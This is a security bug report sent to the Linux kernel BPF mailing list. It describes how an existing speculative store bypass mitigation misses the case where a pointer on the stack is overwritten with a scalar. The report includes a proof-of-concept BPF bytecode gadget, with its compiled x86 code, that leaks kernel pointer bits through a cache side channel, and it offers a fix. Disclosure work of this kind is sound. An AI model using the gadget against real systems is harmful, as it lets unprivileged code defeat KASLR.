Return-Path: <bpf-owner@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 8FA6F66299C
	for <lists+bpf@lfdr.de>; Mon,  9 Jan 2023 16:15:26 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S235105AbjAIPPH (ORCPT <rfc822;lists+bpf@lfdr.de>);
        Mon, 9 Jan 2023 10:15:07 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:55058 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S237220AbjAIPOl (ORCPT <rfc822;bpf@vger.kernel.org>);
        Mon, 9 Jan 2023 10:14:41 -0500
X-Greylist: delayed 600 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Mon, 09 Jan 2023 07:13:18 PST
Received: from faui40.informatik.uni-erlangen.de (faui40.informatik.uni-erlangen.de [131.188.34.40])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id AD9D435917;
        Mon,  9 Jan 2023 07:13:18 -0800 (PST)
Received: from [10.188.34.202] (i4laptop35.informatik.uni-erlangen.de [10.188.34.202])
        (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
         key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
        (No client certificate requested)
        (Authenticated sender: gerhorst)
        by faui40.informatik.uni-erlangen.de (Postfix) with ESMTPSA id 4NrH8D1L4tznkQy;
        Mon,  9 Jan 2023 15:56:28 +0100 (CET)
Message-ID: <edc95bad-aada-9cfc-ffe2-fa9bb206583c@cs.fau.de>
Date:   Mon, 9 Jan 2023 15:56:27 +0100
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
 Thunderbird/102.4.2
From:   Luis Gerhorst <gerhorst@cs.fau.de>
Subject: [BUG] bpf: pointer-leak due to insufficient speculative store bypass
 mitigation
To:     Alexei Starovoitov <ast@kernel.org>,
        Daniel Borkmann <daniel@iogearbox.net>,
        John Fastabend <john.fastabend@gmail.com>,
        Andrii Nakryiko <andrii@kernel.org>,
        Martin KaFai Lau <martin.lau@linux.dev>,
        Song Liu <song@kernel.org>, Yonghong Song <yhs@fb.com>,
        KP Singh <kpsingh@kernel.org>,
        Stanislav Fomichev <sdf@google.com>,
        Hao Luo <haoluo@google.com>, Jiri Olsa <jolsa@kernel.org>,
        Nathan Chancellor <nathan@kernel.org>,
        Nick Desaulniers <ndesaulniers@google.com>,
        Tom Rix <trix@redhat.com>,
        Benedict Schlueter <benedict.schlueter@rub.de>,
        Piotr Krysiuk <piotras@gmail.com>, bpf@vger.kernel.org,
        linux-kernel@vger.kernel.org, llvm@lists.linux.dev
Cc:     Heni Hofmeier <henriette.hofmeier@ruhr-uni-bochum.de>,
        =?UTF-8?Q?Stefan_S=c3=a4cherl?= <stefan.saecherl@use.startmail.com>
Content-Language: en-US
Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg=sha-512; boundary="------------ms080006090905040703020901"
X-Spam-Status: No, score=-4.2 required=5.0 tests=BAYES_00,RCVD_IN_DNSWL_MED,
        SPF_HELO_NONE,SPF_PASS autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <bpf.vger.kernel.org>
X-Mailing-List: bpf@vger.kernel.org

This is a cryptographically signed message in MIME format.

--------------ms080006090905040703020901
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit

I noticed that 2039f26f3aca ("bpf: Fix leakage due to insufficient
speculative store bypass mitigation") does not insert an lfence when a
spilled pointer on the stack is overwritten with a scalar. If the
overwrite is speculatively bypassed, doesn't this allow the pointer to
be speculatively used like a scalar? Importantly, this includes non
constant-time operations such as branches [1, 2]. This would allow
unprivileged BPF programs to leak the numerical pointer value using, for
example, a cache side channel.

To test this behavior, the following bytecode can be integrated into the
assembly generated for libbpf-bootstrap's sockfilter example [3] right
before the bpf_ringbuf_submit():

         .loc    0 62 13 is_stmt 0               # sockfilter.bpf.c:62:13
.Ltmp71:
         #
         # Gadget for Pointer-as-Scalar Spec. Type Confusion on Stack
         # using SSB
         #
         # Relevant program state:
         # r1: skb->ifindex (scalar)
         # r6: ctx_ptr skb
         # r7: ringbuf_elem_ptr e
         # r10: frame pointer (fp)
         # fp-64: not initialized (type STACK_INVALID)
         #
         # Create Spec. Type Confusion:
         #
         r2 = 0                          # scalar for type confusion
         if r1 == 0 goto SCALAR_UNKNOWN  # branch based on user input
         r2 = 1
         # needed to prevent dead-code-elim. for secret-based branch
         #
SCALAR_UNKNOWN:
         *(u64 *)(r10 - 64) = r6         # fp[-64] = ptr
         # lfence added here because of ptr-spill to stack.
         #
         r9 = r10
         # r9: fp alias to encourage ssb
         #
         # Imagine dummy bpf_ringbuf_output() here to train alias
         # predictor for no r9/r10 dependency.
         #
         *(u64 *)(r10 - 64) = r2         # fp[-64] = scalar
         # Arch. overwrite ptr with scalar, SSB may happen here.
         #
         # No lfence added here because stack slot was not STACK_INVALID.
         # Possible mitigation: Also add an lfence if the slot contained
         # a pointer.
         #
         r8 = *(u64 *)(r9 - 64)
         # r8: arch. scalar, spec. ptr
         #
         # Leak ptr using cache side channel, weaken KASLR:
         #
         r8 &= 1                         # choose bit to leak
         if r8 == 0 goto SLOW            # secret-based branch
         #
         # Arch. dead code if r1 is 0, only executes spec.
         # iff ptr bit is 1.
         r2 = *(u32 *)(r7 + 20)          # encode bit in cache
SLOW:
         #
         # Gadget End
         #
         [...]
         .loc    0 63 2 is_stmt 1                # sockfilter.bpf.c:63:2
.Ltmp72:

On x86, this compiles to the following machine code when loaded by an
unprivileged process into Linux v6.1 (commit 51094a24b85e, pulled
2022-12-23):

               152:    xor    %esi,%esi
               154:    test   %rdi,%rdi
               157:    je     0x000000000000015e
               159:    mov    $0x1,%esi
               15e:    mov    %rbx,-0x40(%rbp)
               162:    lfence
               165:    mov    %rbp,%r15
               // dummy bpf_ringbuf_output skipped
               168:    mov    %rsi,-0x40(%rbp) // ssb
               16c:    mov    -0x40(%r15),%r14 // spec. load of ptr
               170:    and    $0x1,%r14
               174:    test   %r14,%r14 // spec. ptr-based branch
               177:    je     0x000000000000017d
               179:    mov    0x14(%r13),%esi // leak
               17d:    [...]

Creating a similar type-confusion using branches failed in all instances
I have tested. However, from 9183671af6db ("bpf: Fix leakage under
speculation on mispredicted branches"), it is not clear to me whether
this is intended or only a by-product of the chosen mitigation.

One might also use the same behavior to speculatively use an invalid
offset in place of a valid offset. However, because of 979d63d50c0c
("bpf: prevent out of bounds speculation on pointer arithmetic") the
resulting scalar-confusion can not be used to access uninitialized memory.

I have drafted a patch to mitigate this by also inserting an lfence if a
pointer-slot is overwritten with a scalar. The patch also includes a
more generic example that is not specific to sockfilter.bpf.c. I assume
the performance impact will be low if pointer-spills are rare. I will
send the patch in reply to this mail.

Prior to submission, this report was kindly reviewed by Henriette
Hofmeier and by anonymous staff members of FAU's Department of Computer
Science 4.

Best regards,
Luis

[1] https://gleissen.github.io/papers/spectre-semantics.pdf
[2] https://arxiv.org/pdf/2005.00294.pdf
[3] 
https://github.com/libbpf/libbpf-bootstrap/blob/599e9ac6ad0947838e18ef606076fe66345f498f/examples/c/sockfilter.bpf.c#L63

--------------ms080006090905040703020901
Content-Type: application/pkcs7-signature; name="smime.p7s"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="smime.p7s"
Content-Description: S/MIME Cryptographic Signature

MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgMFADCABgkqhkiG9w0BBwEAAKCC
EeswggUSMIID+qADAgECAgkA4wvV+K8l2YEwDQYJKoZIhvcNAQELBQAwgYIxCzAJBgNVBAYT
AkRFMSswKQYDVQQKDCJULVN5c3RlbXMgRW50ZXJwcmlzZSBTZXJ2aWNlcyBHbWJIMR8wHQYD
VQQLDBZULVN5c3RlbXMgVHJ1c3QgQ2VudGVyMSUwIwYDVQQDDBxULVRlbGVTZWMgR2xvYmFs
Um9vdCBDbGFzcyAyMB4XDTE2MDIyMjEzMzgyMloXDTMxMDIyMjIzNTk1OVowgZUxCzAJBgNV
BAYTAkRFMUUwQwYDVQQKEzxWZXJlaW4genVyIEZvZXJkZXJ1bmcgZWluZXMgRGV1dHNjaGVu
IEZvcnNjaHVuZ3NuZXR6ZXMgZS4gVi4xEDAOBgNVBAsTB0RGTi1QS0kxLTArBgNVBAMTJERG
Ti1WZXJlaW4gQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgMjCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAMtg1/9moUHN0vqHl4pzq5lN6mc5WqFggEcVToyVsuXPztNXS43O+FZs
FVV2B+pG/cgDRWM+cNSrVICxI5y+NyipCf8FXRgPxJiZN7Mg9mZ4F4fCnQ7MSjLnFp2uDo0p
eQcAIFTcFV9Kltd4tjTTwXS1nem/wHdN6r1ZB+BaL2w8pQDcNb1lDY9/Mm3yWmpLYgHurDg0
WUU2SQXaeMpqbVvAgWsRzNI8qIv4cRrKO+KA3Ra0Z3qLNupOkSk9s1FcragMvp0049ENF4N1
xDkesJQLEvHVaY4l9Lg9K7/AjsMeO6W/VRCrKq4Xl14zzsjz9AkH4wKGMUZrAcUQDBHHWekC
AwEAAaOCAXQwggFwMA4GA1UdDwEB/wQEAwIBBjAdBgNVHQ4EFgQUk+PYMiba1fFKpZFK4OpL
4qIMz+EwHwYDVR0jBBgwFoAUv1kgNgB5oKAia4zV8mHSuCzLgkowEgYDVR0TAQH/BAgwBgEB
/wIBAjAzBgNVHSAELDAqMA8GDSsGAQQBga0hgiwBAQQwDQYLKwYBBAGBrSGCLB4wCAYGZ4EM
AQICMEwGA1UdHwRFMEMwQaA/oD2GO2h0dHA6Ly9wa2kwMzM2LnRlbGVzZWMuZGUvcmwvVGVs
ZVNlY19HbG9iYWxSb290X0NsYXNzXzIuY3JsMIGGBggrBgEFBQcBAQR6MHgwLAYIKwYBBQUH
MAGGIGh0dHA6Ly9vY3NwMDMzNi50ZWxlc2VjLmRlL29jc3ByMEgGCCsGAQUFBzAChjxodHRw
Oi8vcGtpMDMzNi50ZWxlc2VjLmRlL2NydC9UZWxlU2VjX0dsb2JhbFJvb3RfQ2xhc3NfMi5j
ZXIwDQYJKoZIhvcNAQELBQADggEBAIcL/z4Cm2XIVi3WO5qYi3FP2ropqiH5Ri71sqQPrhE4
eTizDnS6dl2e6BiClmLbTDPo3flq3zK9LExHYFV/53RrtCyD2HlrtrdNUAtmB7Xts5et6u5/
MOaZ/SLick0+hFvu+c+Z6n/XUjkurJgARH5pO7917tALOxrN5fcPImxHhPalR6D90Bo0fa3S
PXez7vTXTf/D6OWST1k+kEcQSrCFWMBvf/iu7QhCnh7U3xQuTY+8npTD5+32GPg8SecmqKc2
2CzeIs2LgtjZeOJVEqM7h0S2EQvVDFKvaYwPBt/QolOLV5h7z/0HJPT8vcP9SpIClxvyt7bP
ZYoaorVyGTkwggWsMIIElKADAgECAgcbY7rQHiw9MA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD
VQQGEwJERTFFMEMGA1UEChM8VmVyZWluIHp1ciBGb2VyZGVydW5nIGVpbmVzIERldXRzY2hl
biBGb3JzY2h1bmdzbmV0emVzIGUuIFYuMRAwDgYDVQQLEwdERk4tUEtJMS0wKwYDVQQDEyRE
Rk4tVmVyZWluIENlcnRpZmljYXRpb24gQXV0aG9yaXR5IDIwHhcNMTYwNTI0MTEzODQwWhcN
MzEwMjIyMjM1OTU5WjCBjTELMAkGA1UEBhMCREUxRTBDBgNVBAoMPFZlcmVpbiB6dXIgRm9l
cmRlcnVuZyBlaW5lcyBEZXV0c2NoZW4gRm9yc2NodW5nc25ldHplcyBlLiBWLjEQMA4GA1UE
CwwHREZOLVBLSTElMCMGA1UEAwwcREZOLVZlcmVpbiBHbG9iYWwgSXNzdWluZyBDQTCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJ07eRxH3h+Gy8Zp1xCeOdfZojDbchwFfylf
S2jxrRnWTOFrG7ELf6Gr4HuLi9gtzm6IOhDuV+UefwRRNuu6cG1joL6WLkDh0YNMZj0cZGnl
m6Stcq5oOVGHecwX064vXWNxSzl660Knl5BpBb+Q/6RAcL0D57+eGIgfn5mITQ5HjUhfZZkQ
0tkqSe3BuS0dnxLLFdM/fx5ULzquk1enfnjK1UriGuXtQX1TX8izKvWKMKztFwUkP7agCwf9
TRqaA1KgNpzeJIdl5Of6x5ZzJBTN0OgbaJ4YWa52fvfRCng8h0uwN89Tyjo4EPPLR22MZD08
WkVKusqAfLjz56dMTM0CAwEAAaOCAgUwggIBMBIGA1UdEwEB/wQIMAYBAf8CAQEwDgYDVR0P
AQH/BAQDAgEGMCkGA1UdIAQiMCAwDQYLKwYBBAGBrSGCLB4wDwYNKwYBBAGBrSGCLAEBBDAd
BgNVHQ4EFgQUazqYi/nyU4na4K2yMh4JH+iqO3QwHwYDVR0jBBgwFoAUk+PYMiba1fFKpZFK
4OpL4qIMz+EwgY8GA1UdHwSBhzCBhDBAoD6gPIY6aHR0cDovL2NkcDEucGNhLmRmbi5kZS9n
bG9iYWwtcm9vdC1nMi1jYS9wdWIvY3JsL2NhY3JsLmNybDBAoD6gPIY6aHR0cDovL2NkcDIu
cGNhLmRmbi5kZS9nbG9iYWwtcm9vdC1nMi1jYS9wdWIvY3JsL2NhY3JsLmNybDCB3QYIKwYB
BQUHAQEEgdAwgc0wMwYIKwYBBQUHMAGGJ2h0dHA6Ly9vY3NwLnBjYS5kZm4uZGUvT0NTUC1T
ZXJ2ZXIvT0NTUDBKBggrBgEFBQcwAoY+aHR0cDovL2NkcDEucGNhLmRmbi5kZS9nbG9iYWwt
cm9vdC1nMi1jYS9wdWIvY2FjZXJ0L2NhY2VydC5jcnQwSgYIKwYBBQUHMAKGPmh0dHA6Ly9j
ZHAyLnBjYS5kZm4uZGUvZ2xvYmFsLXJvb3QtZzItY2EvcHViL2NhY2VydC9jYWNlcnQuY3J0
MA0GCSqGSIb3DQEBCwUAA4IBAQCBeEWkTqR/DlXwCbFqPnjMaDWpHPOVnj/z+N9rOHeJLI21
rT7H8pTNoAauusyosa0zCLYkhmI2THhuUPDVbmCNT1IxQ5dGdfBi5G5mUcFCMWdQ5UnnOR7L
n8qGSN4IFP8VSytmm6A4nwDO/afr0X9XLchMX9wQEZc+lgQCXISoKTlslPwQkgZ7nu7YRrQb
tQMMONncsKk/cQYLsgMHM8KNSGMlJTx6e1du94oFOO+4oK4v9NsH1VuEGMGpuEvObJAaguS5
Pfp38dIfMwK/U+d2+dwmJUFvL6Yb+qQTkPp8ftkLYF3sv8pBoGH7EUkp2KgtdRXYShjqFu9V
NCIaE40GMIIHITCCBgmgAwIBAgIMJfzeCQJGjR2GicgiMA0GCSqGSIb3DQEBCwUAMIGNMQsw
CQYDVQQGEwJERTFFMEMGA1UECgw8VmVyZWluIHp1ciBGb2VyZGVydW5nIGVpbmVzIERldXRz
Y2hlbiBGb3JzY2h1bmdzbmV0emVzIGUuIFYuMRAwDgYDVQQLDAdERk4tUEtJMSUwIwYDVQQD
DBxERk4tVmVyZWluIEdsb2JhbCBJc3N1aW5nIENBMB4XDTIyMDExMTEwNDgyN1oXDTI1MDEx
MDEwNDgyN1owgakxCzAJBgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xETAPBgNVBAcMCEVy
bGFuZ2VuMTwwOgYDVQQKDDNGcmllZHJpY2gtQWxleGFuZGVyLVVuaXZlcnNpdGFldCBFcmxh
bmdlbi1OdWVybmJlcmcxETAPBgNVBAQMCEdlcmhvcnN0MQ0wCwYDVQQqDARMdWlzMRYwFAYD
VQQDDA1MdWlzIEdlcmhvcnN0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyaD9
1GYQ1cfsamslbh08nQ3JIeQo6BDEyRCMmxeUK8be1LXhDn/smIAcDoGR6gbBvMcG2w8v8y+p
lA1N8FLsWUygfkUPHzt18W28Z9cVURI17Y5EffXrKxWO3rHBEVhL/KVREibnMwCtI+9lG9nW
ktUhHscygUP/GFjH9OFZrNBhChwOcMmBUkdbGsN9JNFR/IC91UG4l0uUe4HTLBjn3SBvA2Ku
4CcfE9+0PpwMc3U/ysUv58AKNP5xOdXd41mNH6C4lpbLU9RfIqtWcMBNrSRiuQXf+kAMsJZ3
QdvRAeOmYGnfnotQv50dldQlDLzL5yM+hnF2dMc3sHYfN+jffzvvPRPFfMRAAabWTAMpDr+e
Wg0xVuuhc3/qfp3HfD4ImC14D8PIq/HfTDwpfnngn86Tfw1+NlKcsFO2E2zo8ehR7fIZ4m5J
EjJN0TAmrXdfkSfnTi+u7S3mTnm/8hSG1n0tGz8ChlNK4bQvjfbHDgDSNVYLiJ7mwvd2ezMU
3O6GWO2Rkh2ajWz0wKsZj/c+qEah3vVK//hyAU5ZrUMBen0CC2VxDvrTqK5T9U3o2dlnRntH
2mlBnAKZRPjXbqiZPaUafxGl3Ei4kucYqM7uGlRnuuoPHRdbHYl43LpVm3PrAznEio/T8RVQ
oVsW0+bXBwNI0M6crOThU9VRC6vnABUCAwEAAaOCAmEwggJdMD4GA1UdIAQ3MDUwDwYNKwYB
BAGBrSGCLAEBBDAQBg4rBgEEAYGtIYIsAQEECjAQBg4rBgEEAYGtIYIsAgEECjAJBgNVHRME
AjAAMA4GA1UdDwEB/wQEAwIF4DAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwQwHQYD
VR0OBBYEFHKMa3m3JJ+2DN8JQfcfTTPnmog0MB8GA1UdIwQYMBaAFGs6mIv58lOJ2uCtsjIe
CR/oqjt0MDMGA1UdEQQsMCqBEmdlcmhvcnN0QGNzLmZhdS5kZYEUbHVpcy5nZXJob3JzdEBm
YXUuZGUwgY0GA1UdHwSBhTCBgjA/oD2gO4Y5aHR0cDovL2NkcDEucGNhLmRmbi5kZS9kZm4t
Y2EtZ2xvYmFsLWcyL3B1Yi9jcmwvY2FjcmwuY3JsMD+gPaA7hjlodHRwOi8vY2RwMi5wY2Eu
ZGZuLmRlL2Rmbi1jYS1nbG9iYWwtZzIvcHViL2NybC9jYWNybC5jcmwwgdsGCCsGAQUFBwEB
BIHOMIHLMDMGCCsGAQUFBzABhidodHRwOi8vb2NzcC5wY2EuZGZuLmRlL09DU1AtU2VydmVy
L09DU1AwSQYIKwYBBQUHMAKGPWh0dHA6Ly9jZHAxLnBjYS5kZm4uZGUvZGZuLWNhLWdsb2Jh
bC1nMi9wdWIvY2FjZXJ0L2NhY2VydC5jcnQwSQYIKwYBBQUHMAKGPWh0dHA6Ly9jZHAyLnBj
YS5kZm4uZGUvZGZuLWNhLWdsb2JhbC1nMi9wdWIvY2FjZXJ0L2NhY2VydC5jcnQwDQYJKoZI
hvcNAQELBQADggEBAJtkku/mMKt7UG2ghvD//mIuCVhB36VqetpOm0o8RaEIi/KA5jf8q2F+
JihuV11chvT6Sie8UtGGu/V1l18LexvFmQIDMT31z1bbo7SzfHCRq+NZaCbUwECYKcewWa9u
UUw+FQuZ4QzooMMMNvtNxCW5M1esjYbLonOoydT+FTva5RWJNAo4t4LgRJLX0WYUaM58viqb
2Z6bweG+AnjpB2TwTwJ8NdlwpNN/q2aWQWYVUedK2X3vLetyIlyDY2z1lsWHvtGyU/PriEz/
UDv7CMQphqhYobsg05DNs31hmW75XxfXXyXvOaLrjhUeSY6el04/a5Q6/fL7LXkcCivnMZMx
ggUrMIIFJwIBATCBnjCBjTELMAkGA1UEBhMCREUxRTBDBgNVBAoMPFZlcmVpbiB6dXIgRm9l
cmRlcnVuZyBlaW5lcyBEZXV0c2NoZW4gRm9yc2NodW5nc25ldHplcyBlLiBWLjEQMA4GA1UE
CwwHREZOLVBLSTElMCMGA1UEAwwcREZOLVZlcmVpbiBHbG9iYWwgSXNzdWluZyBDQQIMJfze
CQJGjR2GicgiMA0GCWCGSAFlAwQCAwUAoIICXTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcB
MBwGCSqGSIb3DQEJBTEPFw0yMzAxMDkxNDU2MjdaME8GCSqGSIb3DQEJBDFCBECrjejhuCCb
vyEy5L+qrLtvguBEQfFtO9+CiE5d3Y224aGFg4lOmbA+g/MO/Nunp1Y19KydE9y67bBRGrRt
ADd1MGwGCSqGSIb3DQEJDzFfMF0wCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBAjAKBggqhkiG
9w0DBzAOBggqhkiG9w0DAgICAIAwDQYIKoZIhvcNAwICAUAwBwYFKw4DAgcwDQYIKoZIhvcN
AwICASgwga8GCSsGAQQBgjcQBDGBoTCBnjCBjTELMAkGA1UEBhMCREUxRTBDBgNVBAoMPFZl
cmVpbiB6dXIgRm9lcmRlcnVuZyBlaW5lcyBEZXV0c2NoZW4gRm9yc2NodW5nc25ldHplcyBl
LiBWLjEQMA4GA1UECwwHREZOLVBLSTElMCMGA1UEAwwcREZOLVZlcmVpbiBHbG9iYWwgSXNz
dWluZyBDQQIMJfzeCQJGjR2GicgiMIGxBgsqhkiG9w0BCRACCzGBoaCBnjCBjTELMAkGA1UE
BhMCREUxRTBDBgNVBAoMPFZlcmVpbiB6dXIgRm9lcmRlcnVuZyBlaW5lcyBEZXV0c2NoZW4g
Rm9yc2NodW5nc25ldHplcyBlLiBWLjEQMA4GA1UECwwHREZOLVBLSTElMCMGA1UEAwwcREZO
LVZlcmVpbiBHbG9iYWwgSXNzdWluZyBDQQIMJfzeCQJGjR2GicgiMA0GCSqGSIb3DQEBAQUA
BIICAJLyG6v5/5n60c1buW6UEk92SzR7dH8Gp+iOGAMn4P/ck1Yp3QsFSUjWvhlaYfUCZINK
hBhu5WANw2VM7XNCCkdgfQOKmULCgD0dptasihcLbeHvEBzfsafNe2PAvVIaN3KPd91k0zle
ZcNJjWUToPQcHPILBKr609AZzFO5nXhnmqn6+clwsBAAR09OOyFnSIRopyXzSNSclwhoSbZZ
P7fsskfxc1vEizGBYFOtIV37smm7a8b6ZRdryF1jO9XyY2fYhpsWWjoZpGbULzFEymE+efR8
BOIFUopGDAPOIqjOUMFr1nn8Xy2bUMCCiWKXKPYyQY6DxQv6aAhLG85NI1qhCCGXJOvgVYEp
zosiADIKDOIfyIledJiyvjXesBuYELV9OdxnZKECpMOJL7YCe56mZaX/u8WKWRh2688F21xK
jbYKXY1j4BObB1qDiTjoEvQGEVTcTQFWurpuzbekmgcM1k2mLbMrxHi3H/75RBNZ+MMHfWrb
lnpSPKgj0OSGhveZTZYv1keeKdssq2jJ1Nv6ELiUgy7rIIh7PaddBF2ip3ubIUcHtk9RK53I
PY9UtwUdpWrpzDuzd7NCCee8dmW0Qpd3HZCajQVVt3FNXfmomTiqo4NNgc2zWKlAtYZIY1xg
1ZeGkhl0PST5K7OHxNabq4m75ZokuZufZ8KMyHyGAAAAAAAA
--------------ms080006090905040703020901--
